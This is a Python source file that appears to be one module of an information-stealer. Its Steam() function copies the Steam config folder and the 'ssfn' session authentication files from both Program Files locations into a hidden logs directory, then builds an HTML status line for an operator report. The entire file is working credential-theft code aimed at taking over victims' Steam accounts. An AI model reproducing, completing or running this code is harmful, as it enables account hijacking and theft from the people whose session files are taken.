
from os import environ,path,listdir
from shutil import copytree,copy
from manager.logger import Log
from preferences.config import config



def Steam():
    path2 = r'C:\Program Files\Steam'
    path02 = r'C:\Program Files\Steam\config'
    path3 = r'C:\Program Files (x86)\Steam'
    path03 = r'C:\Program Files (x86)\Steam\config'
    try:
        msgInfo = ""
        msgInfo+="\n\n<b>🕹Games🕹</b>"
        Log("===========Games===========")
        try:
            user = environ['USERPROFILE']
            pathtofile = f'{user}\\{config.pathToLogs}'
            directory = f'{pathtofile}\\Games\\Steam\\config'
            directory2 = f'{pathtofile}\\Games\\Steam'
            files2 = [i for i in listdir(path2) if path.isfile(path.join(path2,i)) and \
            'ssfn' in i]
            copytree(path02, directory)
            copy(path2+'\\'+files2[0], directory2)
            copy(path2+'\\'+files2[1], directory2)
        except Exception as error:
            Log(f"Steam ---> {error}")
        try:
            files3 = [i for i in listdir(path3) if path.isfile(path.join(path3,i)) and \
            'ssfn' in i]
            copytree(path03, directory)
            copy(path3+'\\'+files3[0], directory2)
            copy(path3+'\\'+files3[1], directory2)
        except Exception as error:
            Log(f"Steam(x86) ---> {error}")
        msgInfo+="\n∟🎮Steam"
        return msgInfo
    except Exception as error:
        Log(f"Steam(global) ---> {error}")
        return msgInfo

